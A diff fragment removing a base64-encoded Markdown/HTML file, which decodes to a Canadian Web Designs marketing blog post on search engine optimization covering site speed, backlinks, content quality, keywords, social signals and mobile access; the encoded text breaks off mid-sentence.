@@ -1,1 +1,178 @@
-{"data":"LS0tCnRpdGxlOiAiU2VhcmNoIEVuZ2luZSBPcHRpbWl6YXRpb246IEhvdyBJdCBDYW4gQWZmZWN0IFlvdXIgQnVzaW5lc3MgV2Vic2l0ZT8iCnNsdWc6ICJzZWFyY2gtZW5naW5lLW9wdGltaXphdGlvbi1ob3ctaXQtY2FuLWFmZmVjdC15b3VyLWJ1c2luZXNzLXdlYnNpdGUiCmRhdGU6ICIyMDIzLTExLTE2IgphdXRob3I6ICJDYW5hZGlhbiBXZWIgRGVzaWducyIKZGVzY3JpcHRpb246ICJTZWFyY2ggRW5naW5lIE9wdGltaXphdGlvbjogSG93IEl0IENhbiBBZmZlY3QgWW91ciBCdXNpbmVzcyBXZWJzaXRlPyIKa2V5d29yZHM6IFsic2VhcmNoIGVuZ2luZSBvcHRpbWl6YXRpb24gaG93IGl0IGNhbiBhZmZlY3QgeW91ciBidXNpbmVzcyB3ZWJzaXRlIiwiQmxvZyJdCmNhdGVnb3J5OiAiQmxvZyIKZmVhdHVyZWRJbWFnZTogImh0dHBzOi8vb2xkLmNhbmFkaWFud2ViZGVzaWducy5jYS93cC1jb250ZW50L3VwbG9hZHMvMjAyMC8wOC9TRUFSQ0gtRU5HSU5FLU9QVElNSVpBVElPTi0xLnBuZyIKLS0tCgo8L3A+Cgo8ZmlndXJlPjwvZmlndXJlPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPkJyaWVmIE92ZXJ2aWV3IG9mIFNFTzwvc3Ryb25nPjwvaDI+Cgo8cD5JbiB0aGlzIGdlbmVyYXRpb24sIGJ1aWxkaW5nIHlvdXIgYnVzaW5lc3Mgd2Vic2l0ZSBpcyB0aGUgbW9zdCBlc3NlbnRpYWwgdGhpbmcgdG8gaGF2ZSBmb3IgZ3Jvd2luZyB5b3VyIGJ1c2luZXNzLiBUaGlzIGRpZ2l0YWwgd29ybGQgaXMgYSBwZXJmZWN0IHBsYXRmb3JtIHRvIHBlcmZvcm0geW91ciBzdHJhdGVneSBmb3IgZGlnaXRhbCBtYXJrZXRpbmcuIEhhdmluZyBhIGJ1c2luZXNzIHdlYnNpdGUgaXMgdGhlIGluaXRpYWwgc3RlcCBiZWZvcmUgU0VPIHdpbGwgaGVscCB5b3UgdG8gYXR0cmFjdCB5b3VyIHBvdGVudGlhbCBjdXN0b21lcnMuPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj5MZXTigJlzIGRlZmluZSB0aGUgU0VPPC9oMj4KCjxwPlNFTyBpcyBhbiBhY3JvbnltIHRoYXQgc3RhbmRzIGZvciBTZWFyY2ggRW5naW5lIE9wdGltaXphdGlvbiwgaXQgaXMgYSBwcm9jZXNzIG9mIG9wdGltaXppbmcgeW91ciB3ZWJzaXRlIHRvIGluY3JlYXNlIG9yZ2FuaWMgdHJhZmZpYyBvciBub24tcGFpZCByZXN1bHRzIGZyb20gc2VhcmNoIGVuZ2luZSBwYWdlcy4gTW9zdGx5LCBpdCBpcyBkb25lIGJ5IG1vc3Qgd2ViIGRldmVsb3BlcnMgYW5kIHNlYXJjaCBlbmdpbmUgb3B0aW1pemF0aW9uIChTRU8pIHBlcnNvbm5lbCB0byBpbmNyZWFzZSB0aGUgdmlzaWJpbGl0eSBvZiB0aGUgYnVzaW5lc3Mgd2Vic2l0ZSBvZiB0aGVpciBjbGllbnRzLiBUaGUgbWFpbiByb2xlIG9mIHdlYiBkZXZlbG9wZXJzIG9yIFNFTyBwZXJzb25uZWwgaXMgdG8gaW1wcm92ZSB5b3VyIHdlYnNpdGUgYnkgYXNzZW1ibGluZyB3ZWJzaXRlIGRlc2lnbnMsIGNvbnRlbnQsIGFuZCBvdGhlciBmb3JtcyBvZiBtZWRpYSB0byBsb29rIG1vcmUgYXBwZWFsaW5nIGZvciBmdXR1cmUgdmlzaXRvcnMgdG8gdGhlaXIgd2Vic2l0ZS48L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+U2VhcmNoIGVuZ2luZXM8L3N0cm9uZz48L2gyPgoKPHA+VGhlIG1haW4gYXNwZWN0IG9mIHNlYXJjaCBlbmdpbmVzIGlzIHRvIG1lZXQgdGhlIGV4cGVjdGF0aW9uIG9mIHdoYXQgdGhleSBhcmUgbG9va2luZyBmb3IgYW5kIHRvIHByb3ZpZGUgdGhlIGJlc3Qgc2VydmljZSBmb3IgdGhlaXIgdXNlcnMgYnkgZGVsaXZlcmluZyByZXN1bHRzIHdpdGggcmVsZXZhbnQgY29udGVudC48L3A+Cgo8cD5UaGUgc2VhcmNoIGVuZ2luZXMgcHJvdmlkZSBhbnN3ZXJzIHRvIHRoZSBxdWVyaWVzIGZyb20gdGhlIHNlYXJjaGVycy4gVGhleSBjb2xsZWN0IGRhdGEgYnkgY3Jhd2xpbmcgYW5kIGluZGV4aW5nIGFsbCByZWxldmFudCBjb250ZW50IGZyb20gYWxsIHdlYnNpdGVzIHRvIGdpdmUgdGhlIHJlc3VsdHMuPC9wPgoKPHA+SW1wcm92aW5nIHlvdXIgc2VhcmNoIGVuZ2luZSBvcHRpbWl6YXRpb24gY2FuIGluY3JlYXNlIHRoZSBjaGFuY2VzIG9mIHNob3dpbmcgbW9yZSB0YXJnZXRlZCBvcmdhbmljIHRyYWZmaWMgdG8gZXhwYW5kIHRoZSB2aXNpYmlsaXR5IG9mIHlvdXIgd2Vic2l0ZSBvbiBzZWFyY2ggZW5naW5lcy48L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+QWR2YW50YWdlcyBvZiBTZWFyY2ggRW5naW5lIE9wdGltaXphdGlvbiB0byB5b3VyIEJ1c2luZXNzIFdlYnNpdGU8L3N0cm9uZz48L2gyPgoKPHA+U2VhcmNoIGVuZ2luZSBvcHRpbWl6YXRpb24gaXMgb25lIG9mIHRoZSBzdHJhdGVnaWVzIG9mIGVmZmVjdGl2ZSBkaWdpdGFsIG1hcmtldGluZy4gSW4gdGhpcyBzZWN0aW9uLCB5b3Ugd2lsbCBsZWFybiB0aGUgaW1wb3J0YW5jZSBvZiBzZWFyY2ggZW5naW5lIG9wdGltaXphdGlvbiBmb3IgeW91ciBidXNpbmVzcyB3ZWJzaXRlLjwvcD4KCjxoNCBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz4xLiBTZWFyY2ggZW5naW5lIG9wdGltaXphdGlvbiBwcm9tb3RlcyB5b3VyIHdlYnNpdGU8L3N0cm9uZz48L2g0PgoKPHA+V2l0aCB0aGUgaGVscCBvZiBzZWFyY2ggZW5naW5lIG9wdGltaXphdGlvbiwgaXQgY2FuIG1ha2UgeW91ciB3ZWJzaXRlIHZpc2libGUgdG8gc2VhcmNoIGVuZ2luZXMgYnkgYXBwbHlpbmcgc29tZSBzdHJhdGVnaWVzLiBMYXRlciBvbiwgeW91IHdpbGwga25vdyBzb21lIHRlY2huaXF1ZXMgdGhhdCBhcmUgY29tbW9ubHkgdXNlZCBpbiBzZWFyY2ggZW5naW5lIG9wdGltaXphdGlvbi48L3A+Cgo8aDQgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+Mi4gIFNlYXJjaCBlbmdpbmUgb3B0aW1pemF0aW9uIGF0dHJhY3RzIHlvdXIgYXVkaWVuY2U8L3N0cm9uZz48L2g0PgoKPHA+QSB3ZWJzaXRlIHdpdGggZ29vZCBjb250ZW50IGhhcyBhIGh1Z2UgYWR2YW50YWdlIGZvciBzZWFyY2ggZW5naW5lIG9wdGltaXphdGlvbi4gUmFua2luZyBoaWdoZXIgaW4gc2VhcmNoIGVuZ2luZXMgZW5hYmxlcyB5b3VyIGF1ZGllbmNlIHRvIHZpc2l0IHlvdXIgd2Vic2l0ZS4gV2l0aCBnb29kIGNvbnRlbnQsIHlvdSBhcmUgYWxzbyBlZHVjYXRpbmcgeW91ciBhdWRpZW5jZSBhbmQgYWZmZWN0IHRoZWlyIHB1cmNoYXNpbmcgZGVjaXNpb24uIFlvdSBjYW4gdHVybiB5b3VyIGF1ZGllbmNlIGludG8gY3VzdG9tZXJzIHdpdGggdGhlIGhlbHAgb2YgaW5mb3JtYXRpdmUgYW5kIHBlcnN1YXNpdmUgYmxvZ3MuPC9wPgoKPGg0IGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPjMuIFNlYXJjaCBlbmdpbmUgb3B0aW1pemF0aW9uIGJvb3N0cyB5b3VyIHJldmVudWU8L3N0cm9uZz48L2g0PgoKPHA+QXR0cmFjdGluZyBwb3RlbnRpYWwgY3VzdG9tZXJzIHRocm91Z2ggYmxvZ3Mgb24geW91ciB3ZWJzaXRlIGlzIHRoZSBwZXJmZWN0IG9wcG9ydHVuaXR5IHRvIHByb21vdGUgeW91ciBwcm9kdWN0IG9yIHNlcnZpY2VzIHRvIGJvb3N0IHlvdXIgcmV2ZW51ZSBhbmQgc2FsZXMuPC9wPgoKPGg0IGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPjQuIFNlYXJjaCBlbmdpbmUgb3B0aW1pemF0aW9uIGJ1aWxkcyBhIGdvb2QgcmVwdXRhdGlvbjwvc3Ryb25nPjwvaDQ+Cgo8cD5BIGdvb2QgcmVwdXRhdGlvbiBpbmNyZWFzZXMgeW91ciBicmFuZCBhd2FyZW5lc3MuIEJ1aWxkaW5nIGEgZ29vZCByZXB1dGF0aW9uIGZvciBib3RoIHVzZXJzIGFuZCBzZWFyY2ggZW5naW5lcyBpcyBhbiBpbXBvcnRhbnQgYWR2YW50YWdlLiBJdCBjYW4gaW1wYWN0IHRoZWlyIGV4cGVyaWVuY2UgdGhyb3VnaCB5b3VyIHdlYnNpdGUuIEhhdmluZyBhIGdvb2QgcmVwdXRhdGlvbiBjYW4gYWxzbyBhdHRyYWN0IGJhY2stbGlua3MgZnJvbSBvdGhlciByZWxldmFudCBhbmQgYXV0aG9yaXRhdGl2ZSB3ZWJzaXRlcy48L3A+Cgo8aDQgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+NS4gU2VhcmNoIGVuZ2luZSBvcHRpbWl6YXRpb24gaXMgcHJvZml0YWJsZTwvc3Ryb25nPjwvaDQ+Cgo8cD5JZiB5b3XigJlyZSB0aGlua2luZyBhYm91dCBhIHN0cmF0ZWd5IHRvIGF2b2lkIHBhaWQgYWR2ZXJ0aXNpbmcsIG9yZ2FuaWMgdHJhZmZpYyBpcyB0aGUgYmVzdCBhbnN3ZXIuIEVmZmVjdGl2ZSBjb250ZW50IGNhbiBtYWtlIHlvdSByYW5rIGhpZ2ggaW4gc2VhcmNoIGVuZ2luZXMsIHNvIHlvdSBkbyBub3QgaGF2ZSB0byBzcGVuZCBtb25leSBvbiBjbGlja3MuPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPkVmZmVjdGl2ZSBUZWNobmlxdWVzIGZvciBTZWFyY2ggRW5naW5lIE9wdGltaXphdGlvbiAoU0VPKTwvc3Ryb25nPjwvaDI+Cgo8cD4gQmVmb3JlIHlvdSBhcHBseSB0aGUgdGVjaG5pcXVlcyBvZiBzZWFyY2ggZW5naW5lIG9wdGltaXphdGlvbiBmb3IgeW91ciBtYXJrZXRpbmcgc3RyYXRlZ3ksIHlvdSBuZWVkIHRvIGJ1aWxkIHlvdXIgZm91bmRhdGlvbiBvZiB0aGUgYWJpbGl0eSB0byBsZWFybiBhbmQgbWFzdGVyIHRoZSBiYXNpY3MgZmlyc3QuIE1vc3QgYnVzaW5lc3Mgd2Vic2l0ZXMgZG8gaW52ZXN0IHRoZWlyIGRlZXAgYW5hbHlzaXMgb2YgdGhlIGltcG9ydGFuY2Ugb2Ygc2VhcmNoIGVuZ2luZSBvcHRpbWl6YXRpb24uIENvbnRlbnQgd2l0aCBjb25jcmV0ZSwgb3JnYW5pYywgYW5kIGhpZ2gtaW50ZW50IHRyYWZmaWMgd2lsbCBwcm9kdWNlIHRoZSBiZXN0IHNlYXJjaCBlbmdpbmUgcmFua2luZ3MuPC9wPgoKPHA+SGVyZSBhcmUgdGhlIG1vc3QgY29tbW9uLCB5ZXQgdmVyeSBlZmZlY3RpdmUgc2VhcmNoIGVuZ2luZSBvcHRpbWl6YXRpb25zOjwvcD4KCjxoNCBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz4xLiBJbXByb3ZpbmcgdGhlIHNwZWVkIG9mIHlvdXIgd2Vic2l0ZTwvc3Ryb25nPjwvaDQ+Cgo8cD5IYXZlIHlvdSBldmVyIHZpc2l0ZWQgYSB3ZWJzaXRlIGFuZCBnb3R0ZW4gZnJ1c3RyYXRlZCB3aXRoIHdhaXRpbmcgZm9yIHNvIGxvbmcgYmVjYXVzZSBvZiB0aGUgc2xvdy1sb2FkaW5nIHBhZ2U/IFdlbGwsIHNpdGUgc3BlZWQgaXMgYSBjb21tb24gaXNzdWUgZm9yIG1hbnkgd2Vic2l0ZSBvd25lcnMuIE1vc3QgcGVvcGxlIGFudGljaXBhdGUgc2l0ZXMgdG8gbG9hZCB3aXRoaW4gMiBzZWNvbmRzLjwvcD4KCjxwPkFjY29yZGluZyB0byB0aGUgc3R1ZHkgb2YgQWthbWFpLCB3aXRoIDEsMDQ4IHJlc3BvbmRlbnRzIChvbmxpbmUgc2hvcHBlcnMpLCB0aGUgc3R1ZHkgc2hvd3M6PC9wPgoKPHVsPgo8bGk+NTIlIGNsYWltIHRoYXQgZmFzdCBwYWdlIGxvYWRzIGFyZSB2ZXJ5IGNydWNpYWwgZm9yIHRoZW08L2xpPgoKPGxpPiA0NyUgb2YgcGVvcGxlIGV4cGVjdCB0aGUgc2l0ZXMgdG8gbG9hZCB3aXRoaW4gMiBzZWNvbmRzIG9yIGxlc3M8L2xpPgoKPGxpPiA0MCUgYWJhbmRvbiB0aGUgc2l0ZXMgdGhhdCB0YWtlIHRvbyBsb25nIHRvIGxvYWQ8L2xpPgoKPGxpPjY0JSBvZiByZXNwb25kZW50cyBhcmUgbm90IHNhdGlzZmllZCBhbmQgd2lsbCBnbyB0byBhbm90aGVyIG9ubGluZSBzaG9wIG5leHQgdGltZS48L2xpPgo8L3VsPgoKPHA+T24gdGhlIG90aGVyIGhhbmQsIHNpdGUgc3BlZWQgaXMgdmVyeSBpbXBvcnRhbnQgaW4gdXNlciBleHBlcmllbmNlIGFzIHdlbGwgYXMgaW4gc2VhcmNoIGVuZ2luZSBvcHRpbWl6YXRpb24uIE1vc3QgdXNlcnMgYXJlIGltcGF0aWVudCBhbmQgZWFzaWx5IGdldCBmcnVzdHJhdGVkIHdoZW4gaXQgY29tZXMgdG8gZW5jb3VudGVyaW5nIHNsb3ctbG9hZGluZyB3ZWJzaXRlcy4gSW1wcm92aW5nIHlvdXIgc2l0ZSBzcGVlZCBjYW4gYXR0cmFjdCB2aXNpdG9ycyB0byB5b3VyIHdlYnNpdGUuPC9wPgoKPHA+T25lIG9mIHRoZSBtb3N0IGltcG9ydGFudCBmYWN0b3JzIGluIGJvdGggd2Vic2l0ZSBhbmQgbW9iaWxlIG9wdGltaXphdGlvbiBpcyBzaXRlIHNwZWVkIEVsaW1pbmF0aW5nIHRoZSBidWdzIGFuZCB1bm5lY2Vzc2FyeSBhY2Nlc3NvcmllcyBvbiB5b3VyIHdlYnNpdGUgdGhhdCBzbG93cyBkb3duIHRoZSBwYWdlIGNhbiBjcmVhdGUgYSBiZXR0ZXIgcGVyZm9ybWFuY2UgYXMgd2VsbCBhcyB0aGUgZXhwZXJpZW5jZSBvZiB0aGUgdXNlcnMuPC9wPgoKPGg0IGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPjIuIExpbmsgYnVpbGRpbmcgd2l0aCBiYWNrbGlua3M8L3N0cm9uZz48L2g0PgoKPHA+TGluayBidWlsZGluZyBpcyBhbiBlZmZlY3RpdmUgdGVjaG5pcXVlIGZvciBzZWFyY2ggZW5naW5lIG9wdGltaXphdGlvbi4gVGhyb3VnaCBpdCwgdGhlIHBvc3NpYmlsaXR5IG9mIGEgaGlnaCByYW5raW5nIGluIHNlYXJjaCBlbmdpbmVzIGlzIGhpZ2guPC9wPgoKPHA+S2VlcCBpbiBtaW5kIHRoYXQgdXNpbmcgdGhlc2UgdGVjaG5pcXVlcywgd2Ugc2hvdWxkIGZvbGxvdyB0aGUgcnVsZXMgYW5kIGd1aWRlbGluZXMgZnJvbSBHb29nbGUgYW5kIG90aGVyIHNlYXJjaCBlbmdpbmVzIHRvIGF2b2lkIHZpb2xhdGlvbnMuPC9wPgoKPHA+QSB3ZWJzaXRlIHdpdGggbWFueSBiYWNrbGlua3MgY2FuIGVhcm4gYSBoaWdoZXIgcmFua2luZy4gQXNpZGUgZnJvbSBxdWFudGl0eSwgdGhlIHF1YWxpdHkgb2YgeW91ciBzaXRlIGNhbiBidWlsZCB0cnVzdCBhbmQgYXV0aG9yaXR5IGFzIGEgdmFsdWFibGUgcmVzb3VyY2UuPC9wPgoKPHA+VGhlIGZvdW5kZXIgb2YgPGEgaHJlZj0iaHR0cHM6Ly9tb3ouY29tLyIgdGFyZ2V0PSJfYmxhbmsiIHJlbD0ibm9yZWZlcnJlciBub29wZW5lciI+TW96PC9hPiwgUmFuZCBGaXNoa2luLCBzdGF0ZWQgdGhhdCBsaW5raW5nIG91dCBkZWxpdmVycyB0cmFja2FibGUgdHJhZmZpYyB0aGF0IG1ha2VzIHlvdXIgd2Vic2l0ZSBhIHNjYWxhYmxlIGFuZCByZWxldmFudCByZXNvdXJjZSA8L3A+Cgo8cD5BZGRpdGlvbmFsbHksIGxpbmtpbmcgb3V0IHRvIGFuZCBnZXR0aW5nIGxpbmtzIGZyb20gb3RoZXIgcmVsZXZhbnQgc291cmNlcyBpcyBhIGdvb2QgYW5kIGV0aGljYWwgcHJhY3RpY2Ugb24gc2VhcmNoIGVuZ2luZSBvcHRpbWl6YXRpb24uPC9wPgoKPGg0IGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPjMuIENvbnRlbnQgd2l0aCBzdWJzdGFudGlhbCBxdWFsaXR5PC9zdHJvbmc+PC9oND4KCjxwPkhpZ2gtcXVhbGl0eSBjb250ZW50IGNhbiBwZXJzdWFkZSBhbmQgYXR0cmFjdCB5b3VyIHBvdGVudGlhbCBjdXN0b21lcnMgbWFraW5nIHRoZW0gcHVyY2hhc2UgeW91ciBwcm9kdWN0cyBvciBzZXJ2aWNlcy4gQW5vdGhlciBzdHJhdGVneSB0byBib29zdCB5b3VyIHNhbGVzIGFuZCBsZWFkcy48L3A+Cgo8cD5JbiBzZWFyY2ggZW5naW5lIG9wdGltaXphdGlvbiwgY29udGVudCB3aXRoIGhpZ2ggcXVhbGl0eSBjYW4gZ2V0IGdvb2Qgc2VhcmNoIGVuZ2luZSByYW5raW5ncyBhbmQgY2FuIGdldCBiYWNrLWxpbmtzIGZyb20gYXV0aG9yaXRhdGl2ZSB3ZWJzaXRlcy4gQSB3ZWJzaXRlIHdpdGggZ29vZCBjb250ZW50IGNhbiBhbHNvIGNvbnRyaWJ1dGUgdG8gdGhlIHNhdGlzZmFjdGlvbiBvZiB0aGUgdXNlcnMuPC9wPgoKPHA+QWNjb3JkaW5nIHRvIHRoZSBTRVJQIElRIHN0dWR5IGluIHRoZSB5ZWFyIDIwMTIsIHRoZXJlIGlzIGEgaGlnaCBjb3JyZWxhdGlvbiBiZXR3ZWVuIHRoZSBsZW5ndGggb2YgY29udGVudCBhbmQgdGhlIHJhbmtpbmdzLiBUaGUgcmVzdWx0IHJldmVhbGVkIHRoYXQgdGhlICMxIHNwb3QgaW4gdGhlIHNlYXJjaCBlbmdpbmUgaGFzIDIsNDE2IHdvcmRzIGZvciBpdHMgY29udGVudCwgd2hpbGUgdGhlICMxMCBzcG90IGhhcyAyLDAzMiBudW1iZXIgb2Ygd29yZHMuIEl0IGlzIHByb3ZlbiBjbGVhcmx5IHRoYXQgdGhlIGxvbmdlciBjb250ZW50IHlvdSBtYWRlIGdhaW5zIHRoZSBwb3NzaWJpbGl0eSB0byByYW5rIGhpZ2hlciBpbiBzZWFyY2ggZW5naW5lIHJlc3VsdHMuPC9wPgoKPHA+SGVyZSBhcmUgc29tZSBpZGVhcyBmb3IgY3JlYXRpbmcgdGhlIGNvbnRlbnQ6PC9wPgoKPHVsPgo8bGk+QmxvZ3MgYW5kIGFydGljbGVzPC9saT4KCjxsaT5Tb2NpYWwgbWVkaWEgY29udGVudDwvbGk+Cgo8bGk+RS1ib29rczwvbGk+Cgo8bGk+SG93LXRvIGd1aWRlIHR1dG9yaWFsczwvbGk+Cgo8bGk+SW5mb2dyYXBoaWNzIGFuZCBvdGhlciB2aXN1YWwgY29udGVudDwvbGk+Cgo8bGk+VmlkZW9zIGFuZCBhdWRpbyByZWNvcmRpbmdzPC9saT4KPC91bD4KCjxoNCBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz40LiBSZWFkYWJpbGl0eSBvZiB5b3VyIGNvbnRlbnQ8L3N0cm9uZz48L2g0PgoKPHA+VGhlIHJlYWRhYmlsaXR5IG9mIHlvdXIgY29udGVudCBtZWFzdXJlcyB5b3VyIGNyZWF0aXZlIHdyaXRpbmcgc2tpbGxzIGFuZCB0aGUgZXhwZXJpZW5jZSBvZiB5b3VyIGF1ZGllbmNlLiBJdOKAmXMgb25lIG9mIHRoZSBlZmZlY3RpdmUgdGVjaG5pcXVlcyBmb3Igb3B0aW1pemluZyBzZWFyY2ggZW5naW5lcy4gSGVyZSBhcmUgc29tZSB0aXBzIHRoYXQgeW91IGNhbiBhcHBseSBmb3Igd3JpdGluZyBibG9nczo8L3A+Cgo8cD7CtyAgICAgICAgIE1ha2UgeW91ciBjb250ZW50IGVhc3kgdG8gcmVhZCBieSB1c2luZyBzaW1wbGUgd29yZHMgaW5zdGVhZCBvZiBjb21wbGV4IG9uZXMuIERvbuKAmXQgbWFrZSB5b3VyIHJlYWRlcnMgbG9vayBhdCB0aGUgZGljdGlvbmFyeSwganVzdCB0byB1bmRlcnN0YW5kIHdoYXQgeW91J3JlIHNheWluZy48L3A+Cgo8cD7CtyAgICAgICAgIEF2b2lkIG92ZXJsb2FkZWQgY2h1bmtzIG9mIHRleHQuIENvbnRlbnQgd2l0aCB0b28gbXVjaCB0ZXh0IGNhbiBvdmVyd2hlbG0gdGhlIHZpc2l0b3JzIHRvIHlvdXIgd2Vic2l0ZS48L3A+Cgo8cD7CtyAgICAgICAgIExpbWl0IHlvdXIgcGFyYWdyYXBocyB0byAyLTMgc2VudGVuY2VzIGVhY2guIFBheSBhdHRlbnRpb24gdG8geW91ciBzZW50ZW5jZSBzdHJ1Y3R1cmVzIGFuZCBiZSBjcmVhdGl2ZSBpbiBpbnNlcnRpbmcgeW91ciBrZXl3b3Jkcy48L3A+Cgo8cD7CtyAgICAgICAgIEFwcGx5aW5nIHByb3BlciBmb3JtYXQgd2l0aCBjb25jcmV0ZSBhbmQgc3BlY2lmaWMgY29udGVudCBtYWtlcyBpdCBlYXN5IHRvIHVuZGVyc3RhbmQgYnkgcmVhZGVycy4gVXNlIGJ1bGxldHMgYW5kIG51bWJlcnMgaWYgbmVjZXNzYXJ5LjwvcD4KCjxwPsK3ICAgICAgICAgQ2hvb3NpbmcgdGhlIHJpZ2h0IGZvbnQgc3R5bGUgYW5kIGZvbnQgc2l6ZSBjYW4gaW1wYWN0IHRoZSBkZWxpdmVyeSBvZiB5b3VyIG1lc3NhZ2UuIEJlIGF3YXJlIG9mIHVzaW5nIHN5bWJvbHMgdG9vLjwvcD4KCjxwPsK3ICAgICAgICAgVXNpbmcgdmlzdWFsIHByZXNlbnRhdGlvbnMgbGlrZSBpbWFnZXMsIHNjcmVlbnNob3RzLCBncmFwaHMsIGluZm9ncmFwaGljcywgYW5kIHZpZGVvcyBjYW4gY29udHJpYnV0ZSB0byB0aGUgcmVhZGFiaWxpdHkgb2YgeW91ciBjb250ZW50LiBBZGRpdGlvbmFsbHksIGl0IG1ha2VzIHlvdXIgd2Vic2l0ZSBtb3JlIGFwcGVhbGluZy48L3A+Cgo8aDQgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+NS4gS2V5d29yZCBhbmFseXNpczwvc3Ryb25nPjwvaDQ+Cgo8cD5DcmVhdGluZyBjb250ZW50IHdpdGhvdXQga2V5d29yZCByZXNlYXJjaCBpcyB3b3J0aGxlc3MuIFRoZSBjb250ZW50IHdpdGhvdXQgcHJvcGVyIG9wdGltaXphdGlvbiB3aWxsIG5vdCByYW5rIGluIHNlYXJjaCBlbmdpbmVzLiBLZXl3b3JkIHJlc2VhcmNoIGFpbXMgdG8ga25vdyB0aGUgdGFyZ2V0ZWQga2V5d29yZHMgdG8gZWFybiBnb29kIHF1YWxpdHkgdHJhZmZpYy48L3A+Cgo8cD5Vc2luZyBsb25nLXRhaWwga2V5d29yZHMgaXMgYSBncmVhdCB0YWN0aWMgZm9yIHNlYXJjaCBlbmdpbmUgb3B0aW1pemF0aW9uLiBMb25nLXRhaWwga2V5d29yZHMgYXJlIHBocmFzZXMgdGhhdCBhcmUgc3BlY2lmaWMgYW5kIGxlc3MgY29tbW9uIGluIHNlYXJjaCBlbmdpbmVzIHRoYW4gdGhlIG90aGVyIGtleXdvcmRzLiBNb3N0IGxvbmctdGFpbCBrZXl3b3JkcyBoZWxwIHRoZSB3ZWJzaXRlIHJhbmsgaW4gc2VhcmNoIGVuZ2luZSByZXN1bHRzLCBhbmQgdGhlIHZpc2liaWxpdHkgb2YgeW91ciB3ZWJzaXRlIGlzIHByZXR0eSBnb29kLjwvcD4KCjxoNCBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz42LiBUaGUgcG93ZXIgb2Ygc29jaWFsIHNpZ25hbHM8L3N0cm9uZz48L2g0PgoKPHA+SW4gdGhpcyBnZW5lcmF0aW9uLCBzb2NpYWwgbWVkaWEgYmVjYW1lIHBhcnQgb2Ygb3VyIGV2ZXJ5ZGF5IGxpZmUuIEl0IGlzIGEgZ3JlYXQgb3Bwb3J0dW5pdHkgZm9yIG1vc3QgYnVzaW5lc3NlcyBhcyB3ZWxsIGFzIGZvciBwcm9tb3RpbmcgeW91ciB3ZWJzaXRlIHRocm91Z2ggc2VhcmNoIGVuZ2luZSBvcHRpbWl6YXRpb24uPC9wPgoKPHA+U29jaWFsIHNpZ25hbCBpcyB0aGUgd2ViIHBhZ2XigJlzIGNvbGxlY3Rpb24gb2Ygc2hhcmVzLCBsaWtlcywgYW5kIGNvbW1lbnRzIGZyb20gc29jaWFsIG1lZGlhIHBsYXRmb3Jtcy4gVGhlc2Ugc29jaWFsIHNpZ25hbHMgYWRkIHVwIHRvIHRoZSB2aXNpYmlsaXR5IG9mIHlvdXIgd2Vic2l0ZS4gV2hlbiBhIGxvdCBvZiBwZW9wbGUgc2hhcmUgeW91ciBjb250ZW50IG9uIHNvY2lhbCBtZWRpYSwgbW9yZSBwZW9wbGUgd2lsbCBsaW5rIHRvIGl0LjwvcD4KCjxwPkJhc2VkIG9uIHRoZSBjYXNlIHN0dWR5IG9mIE1hdHRoZXcgV29vZHdhcmQsIHRoZXkgYXR0YWluZWQgdHdvIHRvcCAxMCBoaWdoIHNlYXJjaCBwb3NpdGlvbnMgd2l0aCB0aGUgdGFyZ2V0ZWQga2V5d29yZHMg4oCcdW5oZWFsdGhpZXN0IGZvb2TigJ0gdGhyb3VnaCB0aG91c2FuZHMgb2YgRmFjZWJvb2sgc2hhcmVzLiBUaGUgYXJ0aWNsZSBpcyBhbHNvIG1lbnRpb25lZCBvbiBvdGhlciBzaXRlcyBsb29raW5nIGZvciBkZWZpbml0aW9ucyBhbmQgaW5mb3JtYXRpb24gb24gdGhlIHRvcGljLiBPdmVyYWxsLCBzb2NpYWwgbWVkaWEgaXMgYSByYW5raW5nIGZhY3RvciBmb3Igc2VhcmNoIGVuZ2luZSBvcHRpbWl6YXRpb24uPC9wPgoKPHA+T3B0aW1pemUgeW91ciB3ZWJzaXRlIHRvIGVuYWJsZSBzaGFyZWFiaWxpdHkgb24gc29jaWFsIG1lZGlhIHBsYXRmb3Jtcy48L3A+Cgo8aDQgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+Ny4gTW9iaWxlIGFjY2Vzc2liaWxpdHk8L3N0cm9uZz48L2g0PgoKPHA+TW9iaWxlIG9wdGltaXphdGlvbiByZWZlcnMgdG8gdGhlIHByb2Nlc3Mgb2Ygc2VhcmNoIGVuZ2luZSBvcHRpbWl6YXRpb24gYXNzdXJpbmcgdGhlIGFjY2Vzc2liaWxpdHkgYW5kIHZpc2liaWxpdHkgb2YgeW91ciB3ZWJzaXRlIGZyb20gbW9iaWxlIGRldmljZXMgc3VjaCBhcyBzbWFydHBob25lcyBhbmQgdGFibGV0cy4gTW9iaWxlLWZyaWVuZGx5IGRlc2lnbnMgY2FuIGdlbmVyYXRlIG1vcmUgd2Vic2l0ZSB0cmFmZmljIGFuZCBpbmNyZWFzZSBzZWFyY2ggZW5naW5lIHBlcmZvcm1hbmNlLjwvcD4KCjxwPi5Hb29nbGUncyBNb2JpbGUtRmlyc3QgSW5kZXggUnVsZSBzdGF0ZWQgdGhhdCB0aGUgbW9iaWxlIHZlcnNpb24gb2YgdGhlIHdlYnNpdGUgaXMgbW9yZSBmYXZvcmFibGUgdGhhbiB0aGUgZGVza3RvcCB3ZWJzaXRlIGZvciBtb2JpbGUgc2VhcmNoZXMuPC9wPgoKPHA+QWNjb3JkaW5n